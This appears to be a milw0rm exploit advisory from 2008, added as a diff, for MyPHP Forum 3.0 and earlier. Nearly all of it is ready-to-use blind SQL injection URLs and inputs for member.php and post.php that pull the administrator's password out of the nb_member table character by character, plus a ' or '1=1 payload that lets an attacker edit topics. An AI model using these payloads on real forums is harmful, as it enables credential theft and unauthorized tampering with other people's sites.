@@ -1,0 +1,29 @@
+/*
+    -----------------------------------------------------------------------------------
+    MyPHP Forum (Final) <= 3.0 (Edit Topics/Blind SQL Injection) Remote Vulnerabilities
+    -----------------------------------------------------------------------------------
+    Discovered By StAkeR[at]hotmail[dot]it
+    Download On http://www.myphp.ws/
+    
+
+   - member.php (confirm - Blind SQL Injection)
+   - member.php?action=confirm&id=' or ascii(substring((select password from nb_member where uid=1),1,1))=98/* 
+ 
+   - member.php (newconfirm - Blind SQL Injection)
+   - member.php?action=newconfirm&user=' or ascii(substring((select password from nb_member where uid=1),1,1))=98--
+    
+   - member.php?action=reqpwd  (reqpwd - Blind SQL Injection)
+   - insert  ' or ascii(substring((select password from nb_member where uid=1),1,1))=98#
+    
+   - post.php (post Blind SQL Injection)
+   - post.php?action=post&fid=1&tid=1&quote=' or ascii(substring((select password from nb_member where uid=1),1,1))=9%23
+    
+   - post.php (edit - Edit Topics)
+   - post.php?action=edit&fid=1&tid=1&pid=[id topic] ' or '1=1
+        
+    
+    
+    
+/*    
+
+# milw0rm.com [2008-10-30]
